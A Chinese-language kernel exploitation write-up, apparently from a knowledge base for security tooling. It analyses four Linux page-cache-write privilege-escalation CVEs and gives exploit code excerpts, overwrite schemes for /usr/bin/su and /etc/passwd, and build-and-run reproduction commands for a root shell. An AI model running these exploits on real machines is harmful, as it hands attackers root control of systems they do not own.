---
id: "general/01-kernel/01-page-cache-write-family"
title: "Linux 内核 Page-Cache 写入家族：Copy Fail / Dirty Frag / Fragnesia"
title_en: "Linux Kernel Page-Cache Write Family: Copy Fail / Dirty Frag / Fragnesia"
summary: >
  深度分析 4 个基于 splice/vmsplice 零拷贝的 Linux 内核提权漏洞：Copy Fail、Dirty Frag (ESP/RxRPC) 和 Fragnesia，覆盖根因、利用链与受影响发行版对比。
summary_en: >
  In-depth analysis of 4 Linux kernel LPE vulnerabilities leveraging splice/vmsplice zero-copy page-cache write primitives: Copy Fail, Dirty Frag (ESP/RxRPC), and Fragnesia, covering root causes, exploitation chains, and distro impact comparison.
board: "general"
category: "01-kernel"
signals:
  - "page cache poisoning"
  - "splice zero-copy"
  - "in-place decrypt"
  - "kernel privilege escalation"
  - "CVE-2026-31431"
  - "CVE-2026-43284"
  - "CVE-2026-43500"
  - "CVE-2026-46300"
mcp_tools:
  - "kb_router"
  - "workspace_write_text"
keywords:
  - "page cache"
  - "splice"
  - "CVE-2026-31431"
  - "Copy Fail"
  - "Dirty Frag"
  - "Fragnesia"
  - "Linux kernel"
  - "privilege escalation"
  - "AF_ALG"
  - "ESP-in-TCP"
difficulty: "advanced"
tags:
  - "kernel-exploitation"
  - "page-cache"
  - "LPE"
  - "splice-attack"
  - "zero-copy"
language: "zh-CN"
last_updated: "2026-06-25"
related_articles: []
---
# Linux 内核 Page-Cache 写入家族：Copy Fail / Dirty Frag / Fragnesia

## 1. 家族成员

| 漏洞 | CVE | 入口 | 写入单位 | 核心机制 |
|------|-----|------|----------|---------|
| Copy Fail | CVE-2026-31431 | AF_ALG `authencesn` | 4 字节 | `algif_aead` in-place 优化 + authencesn HMAC 前解密 |
| Dirty Frag (ESP) | CVE-2026-43284 | xfrm-ESP / ESP-in-UDP | 4 字节 | UDP splice frag 未标记 SKBFL_SHARED_FRAG → ESP no-COW |
| Dirty Frag (RxRPC) | CVE-2026-43500 | RxRPC / rxkad | 8 字节 | vmsplice 页缓存 → RxRPC 解密路径原地写入 |
| Fragnesia | CVE-2026-46300 | ESP-in-TCP / TCP coalesce | 逐字节可控 | TCP ULP `espintcp` + AES-GCM keystream |

### 共同特征

1. **splice / vmsplice 零拷贝**把只读文件的页缓存页送入内核协议栈
2. **协议解密路径做原地写入**（in-place decrypt），误把共享页缓存当私有缓冲区
3. **HMAC 验证失败后不回滚** — 写入已完成，包被丢弃，但副作用保留
4. **不改磁盘** — 只改页缓存，`stat` / 包管理器看不出来
5. **不需要竞态条件** — 直线型逻辑漏洞

## 2. Copy Fail（CVE-2026-31431）

### 三层根因

**第一层：algif_aead 的 in-place 优化（2017 年引入）**

```c
// 有漏洞：src == dst，输出 SGL 和输入 SGL 相同
aead_request_set_crypt(&areq->cra_u.aead_req,
    rsgl_src,                                    // RX SGL（输入）
    areq->first_rsgl.sgl.sgt.sgl, used, ctx->iv); // 同一个 RX SGL（输出）
```

`splice()` 把文件页缓存送进 AF_ALG socket → scatterlist 持有页缓存页面直接引用。in-place 模式下输出 SGL 包含输入 SGL 的全部页面（包括 Tag 页）。

**第二层：authencesn 在 HMAC 前原地解密**

```c
scatterwalk_map_and_copy(tmp, dst, 0, 8, 0);              // 读 AAD 前 8 字节
scatterwalk_map_and_copy(tmp, dst, 4, 4, 1);              // seqno_hi 写入 dst[4..7]
scatterwalk_map_and_copy(tmp+1, dst, assoclen+cryptlen, 4, 1); // ← 越界写！
```

`assoclen + cryptlen` 偏移处写 4 字节。正常在接收缓冲区内部，但 in-place 时落在页缓存上。

**第三层：两层叠加**

```
scatterwalk_map_and_copy 遍历输出 SGL
    → 走到 sg_chain 链接的 Tag 页面（来自文件页缓存）
    → kmap_local_page 映射 /usr/bin/su 的页缓存
    → seqno_lo 4 字节直接写入 /usr/bin/su .text 段
    → HMAC 验证失败，recvmsg() 返回错误
    → 4 字节已留在页缓存
```

### 利用流程

```python
import socket, os, zlib

a = socket.socket(38, 5, 0)   # AF_ALG, SOCK_SEQPACKET
a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))

# 设置密钥和认证标签大小
v(h, 1, d('0800010000000010' + '0'*64))  # 16 字节零密钥
v(h, 5, None, 4)                         # ALG_SET_AEAD_AUTHSIZE = 4

# splice 文件页缓存 → AF_ALG socket
r, w = os.pipe()
os.splice(f, w, o, offset_src=0)     # 文件 → pipe
os.splice(r, u.fileno(), o)           # pipe → AF_ALG socket

# 构造消息控制 seqno_lo 的值
u.sendmsg([b"A"*4 + payload_chunk], [cmsg], 32768)

# 触发写入
try: u.recv(8+t)
except: 0
```

**Payload**：zlib 压缩的 160 字节最小 ELF：
```
setuid(0) → execve("/bin/sh", NULL, NULL) → exit(0)
```

以 4 字节为单位逐块写入 `/usr/bin/su` 的 `.text` 段。

## 3. Dirty Frag ESP（CVE-2026-43284）

### 漏洞调用链

```
BPF / 用户态
  → unshare(CLONE_NEWUSER | CLONE_NEWNET)
  → NETLINK_XFRM 注册 ESP-in-UDP SA
  → 将 4 字节 payload 写入 XFRMA_REPLAY_ESN_VAL.seq_hi
  → splice(/usr/bin/su → pipe → UDP socket)
  → ESP input 误走 no-COW in-place decrypt
  → authencesn 将 seq_hi 作为 4 字节写入 page cache
  → 重复 48 次覆盖 /usr/bin/su 前 192 字节
  → execve /usr/bin/su → root shell
```

### 核心：UDP datagram append 未标记 SKBFL_SHARED_FRAG

```c
// 修复前：有 frags 但没有 frag_list → 直接 skip_cow
} else if (!skb_has_frag_list(skb)) {
    nfrags = skb_shinfo(skb)->nr_frags;
    nfrags++;
    goto skip_cow;  // ← 跳过 COW！
}

// 修复后：新增 shared-frag 检测
} else if (!skb_has_frag_list(skb) &&
           !skb_has_shared_frag(skb)) {   // ← 新增
    ...
    goto skip_cow;
}
```

TCP 路径会标记 `SKBFL_SHARED_FRAG`，UDP 路径没有 → ESP input 误判为私有 skb → 跳过 `skb_cow_data()`。

## 4. Dirty Frag RxRPC（CVE-2026-43500）

### 离线搜索可控写入

RxRPC/rxkad 路径一次写 8 字节，但写入内容是解密结果。PoC 在用户态模拟内核 `fcrypt` 逻辑，搜索 session key 使得解密结果恰好是目标格式：

```c
// 三次重叠写把 root:x:0:0 改成 root::0:0
int off_a = 4, off_b = 6, off_c = 8;

// 检查函数
fc_check_pa_nullok()   // chars 4-5 = "::"
fc_check_pb_nullok()   // chars 6-7 = "0:"
fc_check_pc_nullok()   // chars 8-15 = "0:GGGGGG:"
```

写入 `/etc/passwd` 后 PAM `nullok` 接受空密码 → `su -` → root shell。

### Wrapper 分发逻辑

```c
// 默认策略：先打 /usr/bin/su，失败 fallback 到 rxrpc/rxkad
rc = su_lpe_main(new_argc, co_argv);           // ESP 路径
if (!su_already_patched()) {
    rc = rxrpc_lpe_main(new_argc, co_argv);    // RxRPC 路径
    for (int i = 0; !passwd_already_patched() && i < 3; i++)
        rc = rxrpc_lpe_main(new_argc, co_argv);
}
```

## 5. Fragnesia（CVE-2026-46300）

### AES-GCM 逐字节可控写入

Fragnesia 通过 ESP-in-TCP + AES-GCM keystream 实现逐字节精确替换：

```c
// 构建 keystream 首字节查找表
for (nonce = 0; nonce <= 0xffff && count < 256; nonce++) {
    store_be32(iv + 4, nonce);
    b = aes_gcm_stream0_byte(alg_fd, iv);
    if (!stream0_have[b]) {
        stream0_have[b] = true;
        stream0_nonce[b] = (uint16_t)nonce;
        count++;
    }
}

// 每字节写入
for (idx = 0; idx < desired_len; idx++) {
    current = read_byte_at(target_file, off);
    need_stream = current ^ desired[idx];       // 需要的 keystream 字节
    choose_iv_for_stream0(need_stream);          // 选择对应 nonce
    run_trigger_pair();                           // 触发一次 ESP-in-TCP splice
}
```

`cipher_byte = plain_byte XOR stream_byte` → 只要控制 stream_byte，就能把任意 current 变成 desired。

### 攻击链路

```
非特权用户
  → unshare(CLONE_NEWUSER) 映射当前用户为 namespace root
  → unshare(CLONE_NEWNET) 创建独立网络命名空间
  → NETLINK_XFRM 注册 ESP-in-TCP state
  → receiver 监听 ::1:5556，延迟启用 TCP_ULP espintcp
  → sender 发送 ESP-in-TCP prefix
  → splice(/usr/bin/su) 把只读文件页缓存引入 TCP skb frag
  → espintcp / XFRM / AES-GCM 路径原地变换 skb frag
  → 逐字节污染 /usr/bin/su 的 page cache
  → page cache 开头 192 字节变成 shell_elf
  → execve("/usr/bin/su", NULL, NULL) → root shell
```

## 6. 四种利用路径对比

| 维度 | Copy Fail | Dirty Frag (ESP) | Dirty Frag (RxRPC) | Fragnesia |
|------|-----------|-----------------|-------------------|-----------|
| 入口 | AF_ALG `authencesn` | XFRM ESP-in-UDP | RxRPC/rxkad | ESP-in-TCP |
| 写入单位 | 4 字节固定 | 4 字节固定 | 8 字节变换 | 逐字节可控 |
| 目标 | `/usr/bin/su` | `/usr/bin/su` | `/etc/passwd` | `/usr/bin/su` |
| 内核配置 | `CONFIG_CRYPTO_USER_API_AEAD` | `CONFIG_XFRM` + ESP | `CONFIG_RXGK` | XFRM + ESP-in-TCP |
| 前置条件 | user namespace | user + net namespace | user + net namespace | user + net namespace |

## 7. 受影响发行版

| 发行版 | Copy Fail | Dirty Frag ESP | Dirty Frag RxRPC | Fragnesia |
|--------|-----------|---------------|-----------------|-----------|
| Ubuntu 22.04 / 24.04 | 受影响 | 受影响 | 可能受限 | AppArmor 可能限制 |
| Debian 12 | 受影响 | 受影响 | 不受影响 | 不受影响 |
| RHEL 8/9/10 | 受影响 | 受影响 | 受影响 | 受影响 |
| Fedora | 受影响 | 受影响 | 受影响 | 受影响 |
| Arch | 受影响 | 受影响 | 受影响 | 受影响 |

## 8. 复现（Copy Fail 最快路径）

```bash
# 检查 AF_ALG 可用
python3 -c "import socket; socket.socket(38,5,0); print('VULNERABLE')"

# 运行 PoC（需要 CONFIG_CRYPTO_USER_API_AEAD）
cd "CVE-2026-31431 Copy Fail"
python3 exploit/exp.py
# 成功后: # id → uid=0(root)
```

### Dirty Frag ESP 复现

```bash
cd "CVE-2026-43284 Dirty Frag/exploit"
gcc -O2 -Wall -o dirtyfrag-exp exp.c
./dirtyfrag-exp
# 成功后: # id → uid=0(root)
```

### Fragnesia 复现

```bash
cd "CVE-2026-46300 Fragnesia/exploit"
gcc -O2 -Wall -Wextra -static exp.c -o fragnesia_exp
./fragnesia_exp
# 成功后 execve /usr/bin/su → root shell
```

## 9. Exit Code 语义

| Exit Code | 含义 |
|-----------|------|
| 0 | 提权成功 |
| 1 | 前置条件失败 |
| 2 | 页缓存污染失败 |

## Evidence

记录: 内核版本、CONFIG 检查结果、dmesg 输出、提权前后 `id` 输出、目标文件 page cache 校验

## MCP 工具映射

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| 知识检索 | `kb_router` | 按内核提权 / page-cache 信号搜索 |
| 环境检查 | 手动 `grep /boot/config-*` | 确认内核配置 |
| 写分析笔记 | `workspace_write_text` | 记录内核版本和配置检查结果 |

## 参考资料

| 来源 | 链接 |
|------|------|
| Copy Fail 官网 | https://copy.fail |
| Copy Fail PoC | https://github.com/theori-io/copy-fail-CVE-2026-31431 |
| Dirty Frag PoC | https://github.com/V4bel/dirtyfrag |
| Red Hat RHSB-2026-003 | https://access.redhat.com/security/vulnerabilities/RHSB-2026-003 |
| NVD CVE-2026-31431 | https://nvd.nist.gov/vuln/detail/CVE-2026-31431 |
| NVD CVE-2026-43284 | https://nvd.nist.gov/vuln/detail/CVE-2026-43284 |
| NVD CVE-2026-43500 | https://nvd.nist.gov/vuln/detail/CVE-2026-43500 |
| NVD CVE-2026-46300 | https://nvd.nist.gov/vuln/detail/CVE-2026-46300 |
| CISA KEV CVE-2026-31431 | https://www.cisa.gov/known-exploited-vulnerabilities-catalog |
| poc-lab 源 | https://github.com/Unclecheng-li/poc-lab (Copy Fail / Dirty Frag / Fragnesia) |
